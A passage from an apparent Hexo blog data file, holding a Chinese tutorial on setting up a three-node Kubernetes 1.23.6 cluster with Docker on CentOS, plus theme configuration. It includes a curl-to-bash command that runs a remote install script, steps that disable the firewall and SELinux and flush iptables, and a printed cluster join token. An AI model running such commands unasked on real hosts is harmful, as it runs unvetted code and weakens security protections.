mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"在线安装\"><a href=\"#在线安装\" class=\"headerlink\" title=\"在线安装\"></a>在线安装</h3><p>安装命令在github上，下载起来会很慢，可自行尝试。<br>如果出现<code>url: (7) Failed to connect to github.com port 443: 拒绝连接</code>错误，可以通过在<code>/etc/hosts</code>文件里添加<code>140.82.114.3 github.com</code>条目解决。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo curl -L <span class=\"string\">&quot;https://github.com/docker/compose/releases/latest/download/docker-compose-<span class=\"subst\">$(uname -s)</span>-<span class=\"subst\">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"离线安装\"><a href=\"#离线安装\" class=\"headerlink\" title=\"离线安装\"></a>离线安装</h3><p>如果因为网络问题不能安装的话，可以通过离线安装，在这里提供一个 V2.23.0 版本的包。<a href=\"https://pan.baidu.com/s/1QB1o3NeihQoWKZ6q0pG6MQ?pwd=hsu3\"><strong>docker-compose-linux-x86_64</strong></a>，提取码：hsu3。</p>\n<p>上传到服务器后，执行以下操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> docker-compose-linux-x86_64 /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class=\"line\">docker-compose -v</span><br></pre></td></tr></table></figure>\n\n<p>如果看到版本号在，即安装成功。</p>"},{"title":"K8S集群环境搭建","date":"2024-03-25T13:28:43.000Z","_content":"\n简单玩了一下K8S，安装也太费劲了，一大堆坑，浅浅记录一下吧。\n\n### 安装环境\n\n1. CentOS Stream release 8\n<!--more-->\n2. K8S v1.23.6\n3. Docker version 26.0.0, build 2ae903e\n\n|主机名|IP|CPU|内存|\n|:---:|:---:|:---:|:---:|\n|k8s-mst|192.168.229.130|4|8G|\n|k8s-nd1|192.168.229.131|4|4G|\n|k8s-nd2|192.168.229.132|4|4G|\n\n### 安装步骤\n\n> 下面的步骤2.1-2.8，是需要在三台虚拟机上都执行的；2.9-2.10只在master主机执行即可；2.11在所有节点主机执行即可；2.12-2.14在master主机执行即可。\n\n#### 基础操作\n\n下面的操作代表的含义依次是：关闭防火墙、关闭selinux、关闭swap分区\n\n```bash\nsystemctl stop firewalld && systemctl disable firewalld && iptables -F\nsed -i 's/enforcing/disabled/' /etc/selinux/config && setenforce 0\nswapoff -a\nsed -ri 's/.*swap.*/#&/' /etc/fstab\n```\n\n#### 分别修改各主机的主机名\n\n```bash\nhostnamectl set-hostname k8s-mst\nhostnamectl set-hostname k8s-nd1\nhostnamectl set-hostname k8s-nd2\n```\n\n#### 修改各主机的hosts文件\n\n```bash\n192.168.229.130 k8s-mst\n192.168.229.131 k8s-nd1\n192.168.229.132 k8s-nd2\n```\n\n利用 `scp` 命令将 `/etc/hosts` 文件复制到其他主机\n\n```bash\nscp /etc/hosts k8s-nd1:/etc/hosts\n```\n\n#### 修改内核参数\n\n```bash\ncat > /etc/sysctl.d/k8s.conf << EOF\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nnet.ipv4.ip_forward = 1\nEOF\n\nsysctl --system\n```\n\n#### [安装Docker](https://nustarain.gitee.io/2023/10/30/DockerInit)\n\n```bash\ncurl -fsSL https://get.docker.com | bash -s docker\n```\n\n如果要适配K8S，需要对Docker的daemon.json文件进行升级，配置如下：\n\n```bash\ncat > /etc/docker/daemon.json << EOF\n{\n\"registry-mirrors\": [\"https://gqs7xcfd.mirror.aliyuncs.com\",\"https://hub-mirror.c.163.com\"],\n\"exec-opts\": [\"native.cgroupdriver=systemd\"],\n\"log-driver\": \"json-file\",\n\"log-opts\": {\n\"max-size\": \"100m\"\n},\n\"storage-driver\": \"overlay2\"\n}\nEOF\n```\n\n启动Docker服务\n\n```bash\nsystemctl daemon-reload && systemctl enable --now docker\n```\n\n#### 配置K8S的yum源\n\n需要自己添加一个用于下载K8S的yum源，这里我使用的是阿里云的源。\n\n```bash\ncat > /etc/yum.repos.d/kubernetes.repo << EOF\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nEOF\n```\n\n#### 安装K8S\n\n1.24.X 版本都不再兼容Docker，所以还是使用1.23.X版本。\n\n```bash\nyum install -y kubelet-1.23.6 kubeadm-1.23.6 kubectl-1.23.6\n```\n\n#### 启动K8S服务\n\n```bash\nsystemctl enable --now kubelet\n```\n\n#### 初始化K8S集群\n\n```bash\nkubeadm init \\\n--kubernetes-version 1.23.6 \\\n--apiserver-advertise-address=192.168.229.130 \\\n--service-cidr=10.96.0.0/12 \\\n--pod-network-cidr=10.244.0.0/16 \\\n--image-repository registry.aliyuncs.com/google_containers\n```\n\n- kubernetes-version 集群版本\n- apiserver-advertise-address API服务器通告地址，即k8s主节点。\n- service-cidr 服务网段\n- pod-network-cidr Pod网段\n- image-repository 镜像仓库\n\n这一步会产生很多奇奇怪怪的问题，但是如果是按照我这个步骤和版本安装下来的，估计是不会出问题的。安装完事之后如果看到如下输出，说明安装成功了。\n\n```bash\nkubeadm join 192.168.229.130:6443 --token iks8xq.pqnnn0uvotgtloyj \\\n--discovery-token-ca-cert-hash\nsha256:674a06791e7637efccdaf9874346d0815a6f864a29670acccaa2aa1c998e2ef4 \n```\n\n#### 配置kubectl\n\n不要清屏，按照上面的提示，依次执行他给出来的命令。\n\n```bash\nmkdir -p $HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\nsudo chown $(id -u):$(id -g) $HOME/.kube/config\n```\n\n#### 节点加入集群\n\n如果还留着提示，直接复制他给出的`kubeadm join`命令，然后执行即可。如果丢了，需要手动查看一下两个参数，`--token`和`--discovery-token-ca-cert-hash`。\n\ntoken可以使用如下命令查看，比如是“xxxxxx”。\n\n```bash\nkubeadm token list\n```\n\ndiscovery-token-ca-cert-hash可以使用如下命令查看，比如是“yyyyyy”。\n\n```bash\nopenssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2> /dev/null | openssl dgst -sha256 -hex | sed 's/^.* //'\n```\n\n然后给他们组合到一块\n\n```bash\nkubeadm join 192.168.229.130:6443 --token xxxxxx \\\n--discovery-token-ca-cert-hash sha256:yyyyyy\n```\n\n#### 安装网络插件CNI\n\n```bash\nmkdir /opt/k8s && cd /opt/k8s\ncurl https://calico-v3-25.netlify.app/archive/v3.25/manifests/calico.yaml -O\n```\n\n这个时我们就下载了一个文件名字叫：calico.yaml，但是这个文件需要改一下cidr。这里的cidr就是我们初始化时候`--pod-network-cidr`字段的cidr。\n\nvim calico.yaml，搜索“CALICO_IPV4POOL_CIDR”。\n\n![修改配置文件](./install-k8s/1.png)\n\n#### 下载calico.yaml文件里描述的镜像\n\ncalico.yaml 里面用的都是docker.io的镜像，你可以先使用`grep image calico.yaml`命令查看一下。然后我们做一下修改，执行以下命令：\n\n```bash\nsed -i 's#docker.io/##g' calico.yaml \n```\n\n完事后你也可以再验证一下：`grep image calico.yaml`。然后kubectl apply一下：\n\n```bash\nkubectl apply -f calico.yaml\n```\n\n这个时候kebe就会自己去下载镜像了，不会前台显示，下载速度取决于你的网速。但是你可以通过`kubectl get pods -n kube-system`命令查看一下，如果镜像下载完了，就会看到如下输出，所有容器都是运行起来的：\n\n![下载验证](./install-k8s/2.png)\n\n这样就完成了K8S的安装。\n\n#### 验证\n\n我们可以去运行一个nginx实例，去看看到底还有没有什么问题。\n\n```bash\nkubectl create deployment nginx --image=nginx\nkubectl expose deployment nginx --port=80 --type=NodePort\nkubectl get pod,svc\n```\n\n![验证kube](./install-k8s/3.png)\n\n在宿主机上访问节点IP:port。\n\n![验证kube](./install-k8s/4.png)\n\n### 其他高级配置\n\n#### 配置在其他节点的控制\n\n这个就是说在任何节点上都可以对k8s的API-server进行访问，对节点进行管理。换言之，你不配置这一步，你只能在主节点进行`kubectl get nodes`命令，其他节点执行不了。\n\n```bash\nscp /etc/kubernetes/admin.conf root@k8s-nd1:/etc/kubernetes\nscp /etc/kubernetes/admin.conf root@k8s-nd2:/etc/kubernetes\n```\n\n拷贝过去之后，分别在两个节点上执行如下命令：\n\n```bash\necho \"export KUBECONFIG=/etc/kubernetes/admin.conf\" >> ~/.bash_profile\nsource ~/.bash_profile\nkubectl get node\n```\n\n如果显示有效内容，说明配置成功了。\n\n#### 配置kubectl命令自动补全\n\n初始配置K8S是不能进行命令补全的，使用起来太麻烦，尤其是对于我这个<kbd>Tab</kbd>键重度使用者，实在太不爽。下面是配置K8S命令补全的方法：\n\n> 一般在master节点执行就可以满足需求，但是如果有需求，也可以在worker节点上配置。\n\n```bash\nyum install -y bash-completion\nsource /usr/share/bash-completion/bash_completion\nsource <(kubectl completion bash)\necho \"source <(kubectl completion bash)\" >> ~/.bashrc\n```","source":"_posts/install-k8s.md","raw":"---\ntitle: K8S集群环境搭建\ndate: 2024-03-25 21:28:43\ncategories: \ntags:\n  - Linux\n  - K8S\n---\n\n简单玩了一下K8S，安装也太费劲了，一大堆坑，浅浅记录一下吧。\n\n### 安装环境\n\n1. CentOS Stream release 8\n<!--more-->\n2. K8S v1.23.6\n3. Docker version 26.0.0, build 2ae903e\n\n|主机名|IP|CPU|内存|\n|:---:|:---:|:---:|:---:|\n|k8s-mst|192.168.229.130|4|8G|\n|k8s-nd1|192.168.229.131|4|4G|\n|k8s-nd2|192.168.229.132|4|4G|\n\n### 安装步骤\n\n> 下面的步骤2.1-2.8，是需要在三台虚拟机上都执行的；2.9-2.10只在master主机执行即可；2.11在所有节点主机执行即可；2.12-2.14在master主机执行即可。\n\n#### 基础操作\n\n下面的操作代表的含义依次是：关闭防火墙、关闭selinux、关闭swap分区\n\n```bash\nsystemctl stop firewalld && systemctl disable firewalld && iptables -F\nsed -i 's/enforcing/disabled/' /etc/selinux/config && setenforce 0\nswapoff -a\nsed -ri 's/.*swap.*/#&/' /etc/fstab\n```\n\n#### 分别修改各主机的主机名\n\n```bash\nhostnamectl set-hostname k8s-mst\nhostnamectl set-hostname k8s-nd1\nhostnamectl set-hostname k8s-nd2\n```\n\n#### 修改各主机的hosts文件\n\n```bash\n192.168.229.130 k8s-mst\n192.168.229.131 k8s-nd1\n192.168.229.132 k8s-nd2\n```\n\n利用 `scp` 命令将 `/etc/hosts` 文件复制到其他主机\n\n```bash\nscp /etc/hosts k8s-nd1:/etc/hosts\n```\n\n#### 修改内核参数\n\n```bash\ncat > /etc/sysctl.d/k8s.conf << EOF\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nnet.ipv4.ip_forward = 1\nEOF\n\nsysctl --system\n```\n\n#### [安装Docker](https://nustarain.gitee.io/2023/10/30/DockerInit)\n\n```bash\ncurl -fsSL https://get.docker.com | bash -s docker\n```\n\n如果要适配K8S，需要对Docker的daemon.json文件进行升级，配置如下：\n\n```bash\ncat > /etc/docker/daemon.json << EOF\n{\n\"registry-mirrors\": [\"https://gqs7xcfd.mirror.aliyuncs.com\",\"https://hub-mirror.c.163.com\"],\n\"exec-opts\": [\"native.cgroupdriver=systemd\"],\n\"log-driver\": \"json-file\",\n\"log-opts\": {\n\"max-size\": \"100m\"\n},\n\"storage-driver\": \"overlay2\"\n}\nEOF\n```\n\n启动Docker服务\n\n```bash\nsystemctl daemon-reload && systemctl enable --now docker\n```\n\n#### 配置K8S的yum源\n\n需要自己添加一个用于下载K8S的yum源，这里我使用的是阿里云的源。\n\n```bash\ncat > /etc/yum.repos.d/kubernetes.repo << EOF\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nEOF\n```\n\n#### 安装K8S\n\n1.24.X 版本都不再兼容Docker，所以还是使用1.23.X版本。\n\n```bash\nyum install -y kubelet-1.23.6 kubeadm-1.23.6 kubectl-1.23.6\n```\n\n#### 启动K8S服务\n\n```bash\nsystemctl enable --now kubelet\n```\n\n#### 初始化K8S集群\n\n```bash\nkubeadm init \\\n--kubernetes-version 1.23.6 \\\n--apiserver-advertise-address=192.168.229.130 \\\n--service-cidr=10.96.0.0/12 \\\n--pod-network-cidr=10.244.0.0/16 \\\n--image-repository registry.aliyuncs.com/google_containers\n```\n\n- kubernetes-version 集群版本\n- apiserver-advertise-address API服务器通告地址，即k8s主节点。\n- service-cidr 服务网段\n- pod-network-cidr Pod网段\n- image-repository 镜像仓库\n\n这一步会产生很多奇奇怪怪的问题，但是如果是按照我这个步骤和版本安装下来的，估计是不会出问题的。安装完事之后如果看到如下输出，说明安装成功了。\n\n```bash\nkubeadm join 192.168.229.130:6443 --token iks8xq.pqnnn0uvotgtloyj \\\n--discovery-token-ca-cert-hash\nsha256:674a06791e7637efccdaf9874346d0815a6f864a29670acccaa2aa1c998e2ef4 \n```\n\n#### 配置kubectl\n\n不要清屏，按照上面的提示，依次执行他给出来的命令。\n\n```bash\nmkdir -p $HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\nsudo chown $(id -u):$(id -g) $HOME/.kube/config\n```\n\n#### 节点加入集群\n\n如果还留着提示，直接复制他给出的`kubeadm join`命令，然后执行即可。如果丢了，需要手动查看一下两个参数，`--token`和`--discovery-token-ca-cert-hash`。\n\ntoken可以使用如下命令查看，比如是“xxxxxx”。\n\n```bash\nkubeadm token list\n```\n\ndiscovery-token-ca-cert-hash可以使用如下命令查看，比如是“yyyyyy”。\n\n```bash\nopenssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2> /dev/null | openssl dgst -sha256 -hex | sed 's/^.* //'\n```\n\n然后给他们组合到一块\n\n```bash\nkubeadm join 192.168.229.130:6443 --token xxxxxx \\\n--discovery-token-ca-cert-hash sha256:yyyyyy\n```\n\n#### 安装网络插件CNI\n\n```bash\nmkdir /opt/k8s && cd /opt/k8s\ncurl https://calico-v3-25.netlify.app/archive/v3.25/manifests/calico.yaml -O\n```\n\n这个时我们就下载了一个文件名字叫：calico.yaml，但是这个文件需要改一下cidr。这里的cidr就是我们初始化时候`--pod-network-cidr`字段的cidr。\n\nvim calico.yaml，搜索“CALICO_IPV4POOL_CIDR”。\n\n![修改配置文件](./install-k8s/1.png)\n\n#### 下载calico.yaml文件里描述的镜像\n\ncalico.yaml 里面用的都是docker.io的镜像，你可以先使用`grep image calico.yaml`命令查看一下。然后我们做一下修改，执行以下命令：\n\n```bash\nsed -i 's#docker.io/##g' calico.yaml \n```\n\n完事后你也可以再验证一下：`grep image calico.yaml`。然后kubectl apply一下：\n\n```bash\nkubectl apply -f calico.yaml\n```\n\n这个时候kebe就会自己去下载镜像了，不会前台显示，下载速度取决于你的网速。但是你可以通过`kubectl get pods -n kube-system`命令查看一下，如果镜像下载完了，就会看到如下输出，所有容器都是运行起来的：\n\n![下载验证](./install-k8s/2.png)\n\n这样就完成了K8S的安装。\n\n#### 验证\n\n我们可以去运行一个nginx实例，去看看到底还有没有什么问题。\n\n```bash\nkubectl create deployment nginx --image=nginx\nkubectl expose deployment nginx --port=80 --type=NodePort\nkubectl get pod,svc\n```\n\n![验证kube](./install-k8s/3.png)\n\n在宿主机上访问节点IP:port。\n\n![验证kube](./install-k8s/4.png)\n\n### 其他高级配置\n\n#### 配置在其他节点的控制\n\n这个就是说在任何节点上都可以对k8s的API-server进行访问，对节点进行管理。换言之，你不配置这一步，你只能在主节点进行`kubectl get nodes`命令，其他节点执行不了。\n\n```bash\nscp /etc/kubernetes/admin.conf root@k8s-nd1:/etc/kubernetes\nscp /etc/kubernetes/admin.conf root@k8s-nd2:/etc/kubernetes\n```\n\n拷贝过去之后，分别在两个节点上执行如下命令：\n\n```bash\necho \"export KUBECONFIG=/etc/kubernetes/admin.conf\" >> ~/.bash_profile\nsource ~/.bash_profile\nkubectl get node\n```\n\n如果显示有效内容，说明配置成功了。\n\n#### 配置kubectl命令自动补全\n\n初始配置K8S是不能进行命令补全的，使用起来太麻烦，尤其是对于我这个<kbd>Tab</kbd>键重度使用者，实在太不爽。下面是配置K8S命令补全的方法：\n\n> 一般在master节点执行就可以满足需求，但是如果有需求，也可以在worker节点上配置。\n\n```bash\nyum install -y bash-completion\nsource /usr/share/bash-completion/bash_completion\nsource <(kubectl completion bash)\necho \"source <(kubectl completion bash)\" >> ~/.bashrc\n```","slug":"install-k8s","published":1,"updated":"2024-05-03T03:55:54.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fw006c7zj35rgwcrd0","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>简单玩了一下K8S，安装也太费劲了，一大堆坑，浅浅记录一下吧。</p>\n<h3 id=\"安装环境\"><a href=\"#安装环境\" class=\"headerlink\" title=\"安装环境\"></a>安装环境</h3><ol>\n<li>CentOS Stream release 8<span id=\"more\"></span></li>\n<li>K8S v1.23.6</li>\n<li>Docker version 26.0.0, build 2ae903e</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">IP</th>\n<th align=\"center\">CPU</th>\n<th align=\"center\">内存</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">k8s-mst</td>\n<td align=\"center\">192.168.229.130</td>\n<td align=\"center\">4</td>\n<td align=\"center\">8G</td>\n</tr>\n<tr>\n<td align=\"center\">k8s-nd1</td>\n<td align=\"center\">192.168.229.131</td>\n<td align=\"center\">4</td>\n<td align=\"center\">4G</td>\n</tr>\n<tr>\n<td align=\"center\">k8s-nd2</td>\n<td align=\"center\">192.168.229.132</td>\n<td align=\"center\">4</td>\n<td align=\"center\">4G</td>\n</tr>\n</tbody></table>\n<h3 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h3><blockquote>\n<p>下面的步骤2.1-2.8，是需要在三台虚拟机上都执行的；2.9-2.10只在master主机执行即可；2.11在所有节点主机执行即可；2.12-2.14在master主机执行即可。</p>\n</blockquote>\n<h4 id=\"基础操作\"><a href=\"#基础操作\" class=\"headerlink\" title=\"基础操作\"></a>基础操作</h4><p>下面的操作代表的含义依次是：关闭防火墙、关闭selinux、关闭swap分区</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl stop firewalld &amp;&amp; systemctl <span class=\"built_in\">disable</span> firewalld &amp;&amp; iptables -F</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/enforcing/disabled/&#x27;</span> /etc/selinux/config &amp;&amp; setenforce 0</span><br><span class=\"line\">swapoff -a</span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;s/.*swap.*/#&amp;/&#x27;</span> /etc/fstab</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"分别修改各主机的主机名\"><a href=\"#分别修改各主机的主机名\" class=\"headerlink\" title=\"分别修改各主机的主机名\"></a>分别修改各主机的主机名</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hostnamectl set-hostname k8s-mst</span><br><span class=\"line\">hostnamectl set-hostname k8s-nd1</span><br><span class=\"line\">hostnamectl set-hostname k8s-nd2</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改各主机的hosts文件\"><a href=\"#修改各主机的hosts文件\" class=\"headerlink\" title=\"修改各主机的hosts文件\"></a>修改各主机的hosts文件</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.229.130 k8s-mst</span><br><span class=\"line\">192.168.229.131 k8s-nd1</span><br><span class=\"line\">192.168.229.132 k8s-nd2</span><br></pre></td></tr></table></figure>\n\n<p>利用 <code>scp</code> 命令将 <code>/etc/hosts</code> 文件复制到其他主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp /etc/hosts k8s-nd1:/etc/hosts</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改内核参数\"><a href=\"#修改内核参数\" class=\"headerlink\" title=\"修改内核参数\"></a>修改内核参数</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/sysctl.d/k8s.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class=\"line\"><span class=\"string\">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class=\"line\"><span class=\"string\">net.ipv4.ip_forward = 1</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">sysctl --system</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"安装Docker\"><a href=\"#安装Docker\" class=\"headerlink\" title=\"安装Docker\"></a><a href=\"https://nustarain.gitee.io/2023/10/30/DockerInit\">安装Docker</a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://get.docker.com | bash -s docker</span><br></pre></td></tr></table></figure>\n\n<p>如果要适配K8S，需要对Docker的daemon.json文件进行升级，配置如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">&quot;registry-mirrors&quot;: [&quot;https://gqs7xcfd.mirror.aliyuncs.com&quot;,&quot;https://hub-mirror.c.163.com&quot;],</span></span><br><span class=\"line\"><span class=\"string\">&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class=\"line\"><span class=\"string\">&quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class=\"line\"><span class=\"string\">&quot;log-opts&quot;: &#123;</span></span><br><span class=\"line\"><span class=\"string\">&quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;,</span></span><br><span class=\"line\"><span class=\"string\">&quot;storage-driver&quot;: &quot;overlay2&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<p>启动Docker服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload &amp;&amp; systemctl <span class=\"built_in\">enable</span> --now docker</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"配置K8S的yum源\"><a href=\"#配置K8S的yum源\" class=\"headerlink\" title=\"配置K8S的yum源\"></a>配置K8S的yum源</h4><p>需要自己添加一个用于下载K8S的yum源，这里我使用的是阿里云的源。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[kubernetes]</span></span><br><span class=\"line\"><span class=\"string\">name=Kubernetes</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=1</span></span><br><span class=\"line\"><span class=\"string\">repo_gpgcheck=1</span></span><br><span class=\"line\"><span class=\"string\">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"安装K8S\"><a href=\"#安装K8S\" class=\"headerlink\" title=\"安装K8S\"></a>安装K8S</h4><p>1.24.X 版本都不再兼容Docker，所以还是使用1.23.X版本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y kubelet-1.23.6 kubeadm-1.23.6 kubectl-1.23.6</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"启动K8S服务\"><a href=\"#启动K8S服务\" class=\"headerlink\" title=\"启动K8S服务\"></a>启动K8S服务</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now kubelet</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"初始化K8S集群\"><a href=\"#初始化K8S集群\" class=\"headerlink\" title=\"初始化K8S集群\"></a>初始化K8S集群</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 